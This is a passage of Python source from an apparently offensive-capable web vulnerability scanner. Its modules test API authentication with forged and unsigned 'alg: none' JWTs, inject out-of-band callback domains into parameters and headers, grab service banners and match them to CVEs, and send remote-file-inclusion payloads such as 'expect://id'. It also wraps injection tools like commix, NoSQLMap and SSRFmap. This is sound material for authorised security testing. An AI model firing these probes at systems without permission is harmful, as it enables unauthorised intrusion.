        }, timeout=TIMEOUT)
        if r.status_code == 200:
            findings.append(make_finding("http_smuggling",
                "H2 Desync Indicator: Ambiguous CL+TE Accepted", "Low",
                "Server accepted both Content-Length and Transfer-Encoding: chunked. "
                "May indicate HTTP desync vulnerability.",
                "Use HTTP/2 end-to-end. Reject requests with both CL and TE headers.",
                url=target, cwe="CWE-444", confidence="Low"))
    except Exception: pass
    return findings




# ─────────────────────────────────────────────────────────────────────────────
# ══════  COMPLETION MODULES v4.2 — ALL MISSING GAPS FILLED  ═════════════════
# ─────────────────────────────────────────────────────────────────────────────

# ── API2 — BROKEN AUTHENTICATION (API-specific) ───────────────────────────────
def module_api2_broken_auth(target, session):
    """API2: API-specific broken authentication checks."""
    findings = []
    logger.log("API2-AUTH", "API authentication checks …")

    API_PATHS = ["/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/graphql",
                 "/api/v1/users", "/api/v1/admin", "/api/v1/config"]

    for path in API_PATHS:
        url = target.rstrip("/") + path
        try:
            # Test 1: No auth header at all
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                ct = r.headers.get("Content-Type", "")
                body = r.text
                # FP guards: must return meaningful data (not just 404 page or empty)
                if len(body) < 50: continue
                if any(e in body.lower() for e in ["not found", "404", "undefined route"]): continue
                if not any(ind in ct for ind in ["json", "xml", "application"]): continue

                # Check: no WWW-Authenticate header on data endpoint
                if "www-authenticate" not in str(r.headers).lower():
                    findings.append(make_finding("api2_broken_auth",
                        f"API Endpoint Without Authentication: {path}", "High",
                        f"API endpoint {path} returns data without requiring authentication. "
                        "No WWW-Authenticate challenge issued.",
                        "Implement JWT/OAuth2 bearer token auth on all API endpoints. "
                        "Return 401 with WWW-Authenticate header for unauthenticated requests.",
                        url=url, cwe="CWE-306", confidence="Medium"))

            # Test 2: Invalid token accepted
            for fake_token in ["invalid_token_dd_4x1", "null", "undefined", "true",
                               "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0."]:
                r2 = session.get(url, headers={"Authorization": f"Bearer {fake_token}"},
                                 timeout=TIMEOUT)
                if r2.status_code == 200 and len(r2.text) > 50:
                    body2 = r2.text.lower()
                    if any(e in body2 for e in ["not found", "404", "error"]): continue
                    if not any(ind in r2.headers.get("Content-Type","")
                               for ind in ["json", "xml"]): continue
                    findings.append(make_finding("api2_broken_auth",
                        f"API Accepts Invalid Token at {path}", "Critical",
                        f"API endpoint {path} returned 200 with fake/invalid token: '{fake_token[:20]}'.",
                        "Validate all tokens cryptographically. Reject malformed/expired tokens.",
                        url=url, payload=f"Bearer {fake_token[:20]}",
                        cwe="CWE-295", confidence="High"))
                    break

        except Exception: pass
    return findings

# ── API4 — UNRESTRICTED RESOURCE CONSUMPTION ──────────────────────────────────
def module_api4_resource(target, session):
    """API4: Detect missing resource consumption controls."""
    findings = []
    logger.log("API4-RES", "Resource consumption checks …")

    API_PATHS = ["/api/search", "/api/v1/search", "/api/users",
                 "/api/v1/users", "/api/v1/items", "/api/data"]

    for path in API_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code not in (200, 201): continue
            if len(r.text) < 20: continue

            # Test: unbounded pagination (large limit)
            for limit_param in ["limit", "size", "count", "per_page", "pageSize"]:
                r2 = session.get(url + f"?{limit_param}=99999", timeout=TIMEOUT)
                if r2.status_code == 200 and len(r2.text) > len(r.text) * 2:
                    findings.append(make_finding("api4_resource",
                        f"No Pagination Limit at {path}?{limit_param}=99999", "Medium",
                        f"API at {path} returns significantly more data with {limit_param}=99999. "
                        "No server-side pagination limit enforced.",
                        "Enforce maximum page size (e.g. 100). Ignore requests exceeding limit. "
                        "Implement cost analysis for expensive queries.",
                        url=url+f"?{limit_param}=99999",
                        cwe="CWE-770", confidence="Medium"))
                    break

            # Test: wildcard search (expensive query)
            for search_param in ["q", "search", "query", "filter", "keyword"]:
                r3 = session.get(url + f"?{search_param}=*", timeout=TIMEOUT)
                t0 = time.time()
                r3b = session.get(url + f"?{search_param}=%25%25%25%25%25",
                                  timeout=TIMEOUT)
                elapsed = (time.time() - t0) * 1000
                if r3 and r3.status_code == 200 and len(r3.text) > len(r.text) * 1.5:
                    findings.append(make_finding("api4_resource",
                        f"Wildcard Search Amplification at {path}", "Low",
                        f"Wildcard search '{search_param}=*' returns significantly more data.",
                        "Validate and restrict search wildcards. Add rate limiting on search.",
                        url=url+f"?{search_param}=*",
                        cwe="CWE-770", confidence="Low"))
                    break

        except Exception: pass

    # Test: deeply nested JSON accepted (stack overflow risk)
    API_POST_PATHS = ["/api/v1/user", "/api/settings", "/api/v1/data", "/api/process"]
    for path in API_POST_PATHS:
        url = target.rstrip("/") + path
        try:
            # Build deeply nested JSON
            nested = {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": "deep"}}}}}}}}}
            r = safe_post(session, url, json=nested, timeout=TIMEOUT)
            if r and r.status_code in (200, 201):
                findings.append(make_finding("api4_resource",
                    f"Deep JSON Nesting Accepted at {path}", "Low",
                    f"API accepts deeply nested JSON (8 levels) at {path}.",
                    "Limit JSON nesting depth. Parse with depth limit to prevent stack overflow.",
                    url=url, cwe="CWE-770", confidence="Low"))
        except Exception: pass

    return findings

# ── API8 — API SECURITY MISCONFIGURATION ──────────────────────────────────────
def module_api8_misconfig(target, session):
    """API8: API-specific security misconfiguration detection."""
    findings = []
    logger.log("API8-MISC", "API security misconfiguration …")

    resp = safe_get(session, target)
    if not resp: return findings

    # Check for API documentation auto-exposure
    API_DOC_PATHS = [
        "/swagger-ui", "/swagger-ui.html", "/swagger-ui/index.html",
        "/api-docs", "/api/docs", "/api/swagger",
        "/redoc", "/api/redoc", "/docs",
        "/api/v1/docs", "/api/v2/docs",
    ]
    for path in API_DOC_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200 and len(r.text) > 200:
                body = r.text.lower()
                if any(ind in body for ind in ["swagger", "openapi", "redoc", "api doc",
                                               "endpoints", "try it out"]):
                    findings.append(make_finding("api8_misconfig",
                        f"API Documentation Exposed: {path}", "Medium",
                        f"API documentation accessible at {path}. "
                        "Reveals all endpoints, parameters, and data structures.",
                        "Restrict API docs to internal/authenticated access in production. "
                        "Disable try-it-out in production environments.",
                        url=url, cwe="CWE-200", confidence="High"))
        except Exception: pass

    # Check for debug/verbose error mode on API
    for ep in ["/api/error", "/api/v1/error", "/api/test-error"]:
        url = target.rstrip("/") + ep + "?trigger=1&__debug__=true"
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code in (200, 500) and any(
                    e in r.text for e in ["Traceback", "Stack Trace:", "line ", "File \""]):
                findings.append(make_finding("api8_misconfig",
                    "API Debug Mode Active", "High",
                    "API returns stack traces in error responses.",
                    "Disable debug mode. Return generic error messages in production.",
                    url=url, cwe="CWE-209", confidence="High"))
        except Exception: pass

    # Check for default API framework pages
    for path, indicator in [
        ("/api",       "Welcome to the API"),
        ("/api/",      "Hello World"),
        ("/api/v1",    "version"),
        ("/api/ping",  "pong"),
        ("/api/health","status"),
        ("/api/status","uptime"),
    ]:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200 and indicator.lower() in r.text.lower():
                # Check: is there any auth?
                if "authorization" not in str(r.headers).lower():
                    findings.append(make_finding("api8_misconfig",
                        f"API Endpoint Without Auth Controls: {path}", "Low",
                        f"API endpoint {path} accessible without authentication.",
                        "Apply consistent authentication to all API paths. "
                        "Disable info endpoints in production.",
                        url=url, cwe="CWE-306", confidence="Low"))
        except Exception: pass

    return findings

# ── HSTS PRELOAD ────────────────────────────────────────────────────────────────
def module_hsts_check(target, session):
    """A02: HSTS completeness — preload, includeSubDomains, max-age."""
    findings = []
    if not target.startswith("https://"): return findings
    logger.log("HSTS", "HSTS policy audit …")
    resp = safe_get(session, target)
    if not resp: return findings
    hsts = resp.headers.get("Strict-Transport-Security", "")
    if not hsts:
        findings.append(make_finding("hsts_check","Missing HSTS Header","High",
            "HTTPS response has no HSTS header.",
            "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            url=target, cwe="CWE-319"))
        return findings
    # Parse HSTS directives
    max_age = re.search(r"max-age\s*=\s*(\d+)", hsts, re.I)
    if max_age:
        age = int(max_age.group(1))
        if age < 15552000:  # 180 days
            findings.append(make_finding("hsts_check",
                f"HSTS max-age Too Short ({age}s)","Medium",
                f"HSTS max-age={age} is less than 180 days (15552000s). "
                "Users are unprotected after expiry.",
                "Set max-age to at least 31536000 (1 year).",
                url=target, cwe="CWE-319"))
    if "includesubdomains" not in hsts.lower():
        findings.append(make_finding("hsts_check","HSTS Missing includeSubDomains","Low",
            "HSTS header lacks includeSubDomains. Subdomains are not protected.",
            "Add includeSubDomains to HSTS header.",
            url=target, cwe="CWE-319"))
    if "preload" not in hsts.lower():
        findings.append(make_finding("hsts_check","HSTS Missing Preload","Low",
            "HSTS lacks preload directive. Not eligible for browser preload list.",
            "Add preload and submit to https://hstspreload.org",
            url=target, cwe="CWE-319"))
    return findings

# ── HTTP METHOD OVERRIDE ────────────────────────────────────────────────────────
def module_method_override(target, session):
    """A05: X-HTTP-Method-Override / _method bypass."""
    findings = []
    logger.log("METH-OVRD", "HTTP method override test …")
    DANGEROUS_METHODS = ["DELETE", "PUT", "PATCH", "TRACE", "DEBUG"]
    for method in DANGEROUS_METHODS[:3]:
        for header in ["X-HTTP-Method-Override", "X-Method-Override",
                       "X-HTTP-Method", "_method"]:
            try:
                # POST with method override to dangerous verb
                r = session.post(target, headers={header: method},
                                 timeout=TIMEOUT, allow_redirects=False)
                # FP guard: check for indication the override was processed
                if r.status_code not in (405, 501, 403, 404):
                    # Not blocked → might have been processed
                    if r.status_code in (200, 204, 202):
                        findings.append(make_finding("method_override",
                            f"HTTP Method Override Accepted ({method} via {header})", "Medium",
                            f"Server accepted {header}: {method} override in POST request.",
                            "Restrict method override headers. Only honour in trusted contexts.",
                            url=target, payload=f"{header}: {method}",
                            cwe="CWE-650", confidence="Low"))
            except Exception: pass
    return findings

# ── CERTIFICATE TRANSPARENCY ────────────────────────────────────────────────────
def module_cert_transparency(target, session):
    """A05/T1595: Mine subdomains from certificate transparency logs."""
    findings = []
    logger.log("CERT-CT", "Certificate transparency log mining …")
    domain = get_domain(target)
    try:
        # crt.sh public API
        r = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15, verify=False,
            headers={"User-Agent": DEFAULT_UA}
        )
        if r.status_code != 200: return findings
        ct_data = json.loads(r.text)
        ct_domains = set()
        for entry in ct_data:
            name_value = entry.get("name_value", "")
            for name in name_value.split("\n"):
                name = name.strip().lower().lstrip("*.")
                if domain in name and name != domain:
                    ct_domains.add(name)
        if ct_domains:
            logger.log("CERT-CT",
                       f"Found {len(ct_domains)} subdomains in CT logs", "SUCCESS")
            findings.append(make_finding("cert_transparency",
                f"CT Logs: {len(ct_domains)} Subdomains Discovered", "Info",
                f"Certificate transparency logs reveal subdomains: "
                f"{', '.join(sorted(ct_domains)[:10])} {'…' if len(ct_domains)>10 else ''}",
                "Monitor your certificate issuance. Use CAA DNS records to restrict CAs.",
                url=f"https://crt.sh/?q=%.{domain}",
                evidence=f"{len(ct_domains)} subdomains",
                cwe="CWE-200", confidence="High"))
        return findings, list(ct_domains)
    except Exception:
        return findings

# ── SNALLYGASTER WRAPPER ───────────────────────────────────────────────────────
def tool_snallygaster(target):
    """Snallygaster — secretive file scanner."""
    findings = []
    script = TOOLS_DIR / "snallygaster" / "snallygaster.py"
    if not script.exists() and not find_bin("snallygaster"): return findings
    logger.log("SNALLYGASTER", f"Snallygaster: {target}", "TOOL")
    cmd = (["snallygaster", target] if find_bin("snallygaster")
           else [sys.executable, str(script), target])
    out = run_cmd(cmd, timeout=120)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        for line in out.splitlines():
            if any(k in line.lower() for k in
                   ["found", "exposed", "leaked", ".git", ".env",
                    "secret", "config", "backup", ".php", "key"]):
                if len(line.strip()) > 10:
                    findings.append(make_finding("sensitive_files",
                        f"Snallygaster: {line.strip()[:80]}", "High",
                        line.strip(), "Review and remove exposed sensitive file.",
                        url=target, tool="snallygaster"))
    return findings

# ── FEROXBUSTER WRAPPER ────────────────────────────────────────────────────────
def tool_feroxbuster(target, workdir):
    """FeroxBuster v2.10+ — with auto-tune and smart filtering."""
    findings = []
    if not find_bin("feroxbuster"): return findings
    WORDLISTS = [
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/wordlists/dirb/common.txt",
        str(workdir/"common.txt"),
    ]
    wl = next((w for w in WORDLISTS if os.path.exists(w)), None)
    if not wl: return findings

    logger.log("FEROXBUST", f"FeroxBuster: {target}", "TOOL")
    of = workdir / "ferox_out.txt"

    run_cmd([
        "feroxbuster",
        "-u",              target,
        "-w",              wl,
        "-o",              str(of),
        "--status-codes",  "200,201,301,302,401,403",
        "-t",              "20",
        "--silent",
        "--no-state",
        "--timeout",       "10",
        "--auto-tune",           # automatically tune FP filtering
        "--filter-similar",      # remove similar responses (FP reduction)
        "--auto-bail",           # stop if too many errors
        "-C",              "404,429,503",  # filter these codes
    ], timeout=300)

    if of.exists():
        for line in of.read_text(errors="ignore").splitlines():
            m = re.search(r"(\d{3})\s+\S+\s+\S+\s+(https?://\S+)", line)
            if m:
                code, url = m.groups()
                path = urlparse(url).path
                sev  = ("High" if any(k in path for k in
                                      ["admin","config","backup","debug"])
                        else "Low")
                findings.append(make_finding("sensitive_files",
                    f"feroxbuster: {path} [{code}]", sev,
                    f"feroxbuster found {url} (HTTP {code})",
                    "Review; restrict if sensitive.", url=url, tool="feroxbuster"))
    return findings


def tool_commix(target):
    """Commix — command injection scanner (detection only)."""
    findings = []
    if not find_bin("commix"): return findings
    logger.log("COMMIX", f"Commix cmd injection: {target}", "TOOL")
    out = run_cmd(["commix", "--url", target, "--batch", "--level=2",
                   "--technique=CTBR", "--timeout=10"], timeout=180)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        if "Pseudo-Terminal" in out or "[shell]" in out.lower():
            findings.append(make_finding("ssti",
                "OS Command Injection (Commix)", "Critical",
                "Commix detected command injection — RCE possible.",
                "Sanitise all inputs. Avoid shell calls with user data.",
                url=target, tool="commix", cwe="CWE-78", confidence="High"))
    return findings

# ── TPLMAP WRAPPER ─────────────────────────────────────────────────────────────
def tool_tplmap(target):
    """TplMap — SSTI scanner."""
    findings = []
    script = TOOLS_DIR / "tplmap" / "tplmap.py"
    if not script.exists(): return findings
    logger.log("TPLMAP", f"TplMap: {target}", "TOOL")
    out = run_cmd([sys.executable, str(script), "-u", target, "--level=3"],
                  timeout=180, cwd=str(TOOLS_DIR/"tplmap"))
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        if "is vulnerable" in out.lower() or "engine:" in out.lower():
            findings.append(make_finding("ssti",
                "SSTI Confirmed by TplMap", "Critical",
                f"TplMap: {out[:200]}",
                "Never pass user input to template engines.",
                url=target, tool="tplmap", cwe="CWE-94", confidence="High"))
    return findings

# ── XSSTRIKE WRAPPER ───────────────────────────────────────────────────────────
def tool_xsstrike(target):
    """XSStrike — advanced XSS scanner."""
    findings = []
    script = TOOLS_DIR / "XSStrike" / "xsstrike.py"
    if not script.exists(): return findings
    logger.log("XSSTRIKE", f"XSStrike: {target}", "TOOL")
    out = run_cmd([sys.executable, str(script), "--url", target,
                   "--skip-dom", "--timeout", "10"],
                  timeout=180, cwd=str(TOOLS_DIR/"XSStrike"))
    if out and "vulnerable" in out.lower():
        for line in out.splitlines():
            if "vuln" in line.lower() or "[!]" in line:
                findings.append(make_finding("xss",
                    "XSS Detected by XSStrike", "High",
                    line.strip(), "Sanitise output; implement CSP.",
                    url=target, tool="XSStrike",
                    cwe="CWE-79", confidence="Medium"))
    return findings

# ── CORSCANNER WRAPPER ─────────────────────────────────────────────────────────
def tool_corscanner(target):
    """CORScanner — comprehensive CORS scanner."""
    findings = []
    script = TOOLS_DIR / "CORScanner" / "cors_scan.py"
    if not script.exists(): return findings
    logger.log("CORSCAN", f"CORScanner: {target}", "TOOL")
    out = run_cmd([sys.executable, str(script), "-u", target], timeout=90)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        if "vulnerable" in out.lower() or "misconfigur" in out.lower():
            findings.append(make_finding("cors",
                "CORS Misconfiguration (CORScanner)", "High",
                f"CORScanner: {out[:200]}",
                "Restrict CORS to trusted origins.",
                url=target, tool="CORScanner", cwe="CWE-942"))
    return findings

# ── CORSY WRAPPER ──────────────────────────────────────────────────────────────
def tool_corsy(target):
    """Corsy — CORS misconfiguration scanner."""
    findings = []
    script = TOOLS_DIR / "Corsy" / "corsy.py"
    if not script.exists(): return findings
    logger.log("CORSY", f"Corsy: {target}", "TOOL")
    out = run_cmd([sys.executable, str(script), "-u", target, "-q"], timeout=90)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        if "vulnerable" in out.lower() or "misconfigured" in out.lower():
            findings.append(make_finding("cors",
                "CORS Misconfiguration (Corsy)", "High",
                f"Corsy: {out[:200]}",
                "Restrict CORS to trusted origins.",
                url=target, tool="Corsy", cwe="CWE-942"))
    return findings

# ── JWT_TOOL WRAPPER ───────────────────────────────────────────────────────────
def tool_jwt_tool(target, session):
    """jwt_tool — JWT vulnerability scanner."""
    findings = []
    script = TOOLS_DIR / "jwt_tool" / "jwt_tool.py"
    if not script.exists(): return findings
    resp = safe_get(session, target)
    if not resp: return findings
    JWT_PAT = r"eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}"
    tokens = list(set(re.findall(JWT_PAT, resp.text + str(dict(resp.cookies)))))
    if not tokens: return findings
    logger.log("JWT-TOOL", f"Testing {len(tokens)} JWT(s) …", "TOOL")
    for tok in tokens[:2]:
        out = run_cmd([sys.executable, str(script), tok, "-X", "a", "-M", "at"],
                      timeout=60)
        if out and ("VULNERABLE" in out.upper() or "none" in out.lower()):
            findings.append(make_finding("jwt",
                "JWT Vulnerability (jwt_tool)", "High",
                f"jwt_tool: {out[:200]}",
                "Fix JWT; reject 'none' algorithm.",
                url=target, tool="jwt_tool", cwe="CWE-347"))
    return findings

# ── GRAPHQLMAP WRAPPER ─────────────────────────────────────────────────────────
def tool_graphqlmap(target):
    """GraphQLMap — GraphQL security scanner."""
    findings = []
    script = TOOLS_DIR / "graphqlmap" / "graphqlmap.py"
    if not script.exists(): return findings
    gql_ep = target.rstrip("/") + "/graphql"
    try:
        r = requests.post(gql_ep, json={"query": "{__typename}"},
                          timeout=5, verify=False)
        if r.status_code != 200 or "__typename" not in r.text:
            return findings
    except Exception: return findings
    logger.log("GRAPHQLMAP", f"GraphQLMap: {gql_ep}", "TOOL")
    out = run_cmd([sys.executable, str(script), "-u", gql_ep,
                   "--dump-queries", "--nosend"], timeout=60)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        findings.append(make_finding("graphql",
            "GraphQL Endpoint Analysed (GraphQLMap)", "Info",
            f"GraphQLMap at {gql_ep}",
            "Review GraphQL security: disable introspection, add depth limits, auth.",
            url=gql_ep, tool="graphqlmap"))
    return findings

# ── NOSQLMAP WRAPPER ───────────────────────────────────────────────────────────
def tool_nosqlmap(target):
    """NoSQLMap — NoSQL injection scanner."""
    findings = []
    script = TOOLS_DIR / "NoSQLMap" / "nosqlmap.py"
    if not script.exists(): return findings
    logger.log("NOSQLMAP", f"NoSQLMap: {target}", "TOOL")
    out = run_cmd([sys.executable, str(script), "--attack", "1",
                   "--url", target, "--noInteraction"], timeout=120)
    if out and out not in ("TIMEOUT", "NOT_FOUND"):
        if any(k in out.lower() for k in ["vulnerable", "injection", "extracted"]):
            findings.append(make_finding("nosqli",
                "NoSQL Injection (NoSQLMap)", "Critical",
                f"NoSQLMap: {out[:200]}",
                "Validate and sanitise all inputs. Use typed NoSQL queries.",
                url=target, tool="NoSQLMap", cwe="CWE-943"))
    return findings

# ── SSRFMAP WRAPPER ────────────────────────────────────────────────────────────
def tool_ssrfmap(target):
    """SSRFmap — SSRF scanner with banner-stripping to prevent FPs."""
    findings = []
    script = TOOLS_DIR / "SSRFmap" / "ssrfmap.py"
    if not script.exists(): return findings
    logger.log("SSRFMAP", f"SSRFmap: {target}", "TOOL")

    # Use --json output to avoid parsing the ASCII banner as a finding
    out = run_cmd([sys.executable, str(script), "-r", target,
                   "--module", "portscan", "--json"], timeout=120)

    if not out or out in ("TIMEOUT", "NOT_FOUND"):
        return findings

    # Strip all non-JSON lines (banner, ASCII art, progress output)
    # Only parse lines that are valid JSON objects
    json_findings = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("{") and not line.startswith("["):
            continue  # skip banner/progress lines
        try:
            data = json.loads(line)
            # Must have explicit vulnerability indicator in JSON structure
            if isinstance(data, dict):
                is_vuln = (data.get("vulnerable", False) or
                           data.get("status") == "vulnerable" or
                           "ssrf" in str(data.get("type","")).lower())
                if is_vuln:
                    json_findings.append(data)
        except Exception:
            pass  # Not valid JSON — skip it

    for vuln_data in json_findings:
        logger.log("SSRFMAP",
            f"SSRF confirmed: {vuln_data.get('module','unknown')}", "CRITICAL")
        findings.append(make_finding("ssrf",
            "SSRF Confirmed by SSRFmap", "Critical",
            f"SSRFmap JSON: {json.dumps(vuln_data)[:300]}",
            "Validate/allowlist all URLs. Block RFC-1918 ranges at network egress.",
            url=target, tool="SSRFmap", cwe="CWE-918", confidence="High"))

    return findings

# ── INTERACTSH OOB ─────────────────────────────────────────────────────────────
def module_interactsh_oob(target, session):
    """A03: OOB injection testing via interactsh — non-blocking, max 20s total."""
    findings  = []
    if not find_bin("interactsh-client"): return findings
    logger.log("OOB", "Interactsh OOB probe (16s window) …")

    import queue as _queue

    oob_domain  = None
    output_q    = _queue.Queue()
    oob_file    = "/tmp/dd_oob_hits.txt"

    def _reader(proc, q):
        """Read first JSON line without blocking the main thread."""
        try:
            for raw_line in proc.stdout:
                raw_line = raw_line.strip()
                if raw_line:
                    q.put(raw_line)
                    return
        except Exception as ex:
            q.put(f"ERR:{ex}")

    proc = None
    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json", "-o", oob_file, "-v"],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            text=True, bufsize=1,
            env={**os.environ, "PATH": _EXT_PATH})

        reader = threading.Thread(target=_reader, args=(proc, output_q), daemon=True)
        reader.start()
        reader.join(timeout=8)   # Max 8s to get registration line

        if not output_q.empty():
            line = output_q.get_nowait()
            if not line.startswith("ERR:"):
                try:
                    data       = json.loads(line)
                    oob_domain = data.get("domain", "")
                except Exception:
                    m = re.search(r'"domain"\s*:\s*"([^"]+)"', line)
                    if m: oob_domain = m.group(1)

        if not oob_domain:
            if proc:
                try: proc.terminate()
                except Exception: pass
            return findings

        logger.log("OOB", f"OOB domain: {oob_domain}", "SUCCESS")

        # Inject OOB domain into parameters (detection-only, no exploitation)
        FUZZ = ["url","dest","redirect","src","image","file","host",
                "domain","callback","webhook","endpoint","to","from","link"]
        params = list(dict.fromkeys(extract_params(target) + FUZZ))[:8]
        for p in params:
            for pl in [f"http://{oob_domain}", f"//{oob_domain}",
                       f"https://{oob_domain}/?x=1"]:
                try:
                    session.get(inject_param(target, p, pl), timeout=5)
                except Exception: pass

        # Also probe via common headers
        for hdr, val in [
            ("Referer",          f"http://{oob_domain}"),
            ("X-Forwarded-Host", oob_domain),
            ("Origin",           f"http://{oob_domain}"),
        ]:
            try:
                session.get(target, headers={hdr: val}, timeout=5)
            except Exception: pass

        # Wait up to 8s for incoming interaction
        time.sleep(8)
        try: proc.terminate()
        except Exception: pass

        # Check hits file written by interactsh-client -o
        if os.path.exists(oob_file):
            try:
                hits = open(oob_file, errors="ignore").read()
                if oob_domain in hits or '"dns"' in hits or '"http"' in hits:
                    logger.log("OOB", "OOB interaction confirmed!", "CRITICAL")
                    findings.append(make_finding("interactsh_oob",
                        "Out-of-Band Interaction Confirmed", "High",
                        f"Interactsh received a callback (DNS/HTTP) via {oob_domain}. "
                        "Indicates SSRF, blind injection, or DNS rebinding vulnerability.",
                        "Audit all URL/host parameters. Allowlist egress destinations. "
                        "Block SSRF at network level.",
                        url=target, evidence=oob_domain,
                        cwe="CWE-918", confidence="High"))
                os.remove(oob_file)
            except Exception: pass

    except FileNotFoundError:
        pass  # interactsh-client not installed
    except Exception as e:
        logger.log("OOB", f"OOB error: {e}", "ERROR")
        try:
            if proc: proc.terminate()
        except Exception: pass

    return findings



# ═══════════════════════════════════════════════════════════════════════════════
# NEW MODULES v6.0 — ALL AI-RECOMMENDED ADDITIONS
# ═══════════════════════════════════════════════════════════════════════════════

# ── DEEP TECHNOLOGY FINGERPRINT (200+ signatures) ─────────────────────────────
def module_tech_deep(target, session):
    """Deep technology fingerprinting using 200+ Wappalyzer-style signatures."""
    findings = []
    logger.log("TECH-DEEP", "Deep technology fingerprint …")
    resp = safe_get(session, target)
    if not resp: return findings

    body      = resp.text.lower()
    hdr_str   = str(resp.headers).lower()
    cookie_str = str(dict(resp.cookies)).lower()
    detected  = []

    for tech, sigs in TECH_SIGNATURES.items():
        matched = False
        for body_sig in sigs.get("body", []):
            if body_sig.lower() in body:
                matched = True; break
        if not matched:
            for hdr_sig in sigs.get("hdrs", []):
                key, _, val = hdr_sig.partition(": ")
                if val:
                    if key.lower() in hdr_str and val.lower() in hdr_str:
                        matched = True; break
                else:
                    if key.lower() in hdr_str:
                        matched = True; break
        if not matched:
            for c_sig in sigs.get("cookie", []):
                if c_sig.lower() in cookie_str:
                    matched = True; break
        if matched:
            detected.append(tech)

    if detected:
        logger.log("TECH-DEEP", f"Detected: {', '.join(detected[:8])}", "SUCCESS")
        score, vector, rating = CVSS31.for_module("info_disclosure")
        findings.append(make_finding("recon",
            f"Technology Stack: {', '.join(detected[:6])}{'…' if len(detected)>6 else ''}",
            "Info",
            f"Detected {len(detected)} technologies: {', '.join(detected)}",
            "Keep all frameworks updated. Remove version disclosures. Review tech-specific CVEs.",
            url=target, cwe="CWE-200",
            evidence=f"cvss={score} vector={vector}"))
    return findings


# ── SERVICE BANNER GRABBING ────────────────────────────────────────────────────
def module_banner_grab(target):
    """
    Grab service banners from open ports — reveals exact versions.
    Correlates with NVD CVE database for instant vulnerability matching.
    """
    findings = []
    logger.log("BANNER", "Service banner grabbing …")
    domain = get_domain(target)

    BANNER_PORTS = {
        21:   ("FTP",   "\r\n"),
        22:   ("SSH",   None),
        23:   ("Telnet",None),
        25:   ("SMTP",  "EHLO darkdevil\r\n"),
        110:  ("POP3",  None),
        143:  ("IMAP",  None),
        3389: ("RDP",   None),
        5900: ("VNC",   None),
        1433: ("MSSQL", None),
        3306: ("MySQL", None),
        5432: ("PG",    None),
        6379: ("Redis", "PING\r\n"),
        27017:("Mongo", None),
        9200: ("ES",    "GET / HTTP/1.0\r\n\r\n"),
        7001: ("WebLogic", None),
        8080: ("HTTP-Alt","GET / HTTP/1.0\r\n\r\n"),
    }

    for port, (svc, probe) in BANNER_PORTS.items():
        try:
            import socket as _sock
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(4)
            s.connect((domain, port))
            if probe:
                s.send(probe.encode(errors='ignore'))
            banner = s.recv(1024).decode(errors='ignore').strip()[:300]
            s.close()
            if not banner: continue

            logger.log("BANNER", f"Port {port} ({svc}): {banner[:60]}", "SUCCESS")

            # Cross-reference CVE database
            cves = PORT_CVE_DB.get(port, [])
            cve_info = ""
            if cves:
                top_cve = max(cves, key=lambda x: x[2])
                cve_info = f" | Known CVE: {top_cve[0]} ({top_cve[1]}, CVSS {top_cve[2]})"

            sev = "High" if port in (21,23,25,110,143,3389,5900) else "Medium"
            score, vector, _ = CVSS31.for_module("recon")

            findings.append(make_finding("recon",
                f"Service Banner: {svc} on port {port}",
                sev,
                f"Port {port} ({svc}) banner: '{banner[:150]}'{cve_info}",
                f"Disable unnecessary services. Update to latest version. "
                f"Restrict port {port} to required IPs only.",
                url=f"tcp://{domain}:{port}",
                evidence=f"banner={banner[:100]}, cvss={score}",
                cwe="CWE-200", confidence="High"))

            # Separate CVE finding if critical
            for cve_id, cve_desc, cve_score in cves:
                if cve_score >= 9.0:
                    findings.append(make_finding("recon",
                        f"Critical CVE on Port {port}: {cve_id}",
                        "Critical",
                        f"Port {port} ({svc}) may be vulnerable to {cve_id}: {cve_desc} (CVSS {cve_score}). "
                        f"Banner: '{banner[:100]}'",
                        f"Patch immediately. Update {svc} service.",
                        url=f"tcp://{domain}:{port}",
                        payload=cve_id, cwe=cve_id,
                        evidence=f"cvss={cve_score}, vector=AV:N/AC:L/PR:N/UI:N",
                        confidence="Medium"))
        except Exception:
            pass
    return findings


# ── RFI — REMOTE FILE INCLUSION ────────────────────────────────────────────────
def module_rfi(target, session):
    """
    A01/T1190: Remote File Inclusion — zero-FP via:
    1. Use a unique OOB URL that we control (returns known content)
    2. Baseline must not contain the content
    3. Attack response must contain the known content from OOB URL
    """
    findings = []
    logger.log("RFI", "Remote File Inclusion detection …")

    # Use a reliable public URL that returns known, unique content
    RFI_CANARY = f"ddRFI{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}"
    # Use httpbin.org which returns known JSON with our data
    OOB_URLS = [
        (f"https://httpbin.org/get?dd_rfi={RFI_CANARY}", RFI_CANARY),
        (f"http://httpbin.org/get?dd_rfi={RFI_CANARY}",  RFI_CANARY),
        (f"https://example.com/",                          "Example Domain"),
        ("data://text/plain,ddRFIconfirmed",               "ddRFIconfirmed"),
        ("expect://id",                                    "uid="),  # PHP expect wrapper
        ("php://input",                                    None),    # PHP input stream
    ]
    FUZZ = ["page","file","include","template","load","src","path","module",
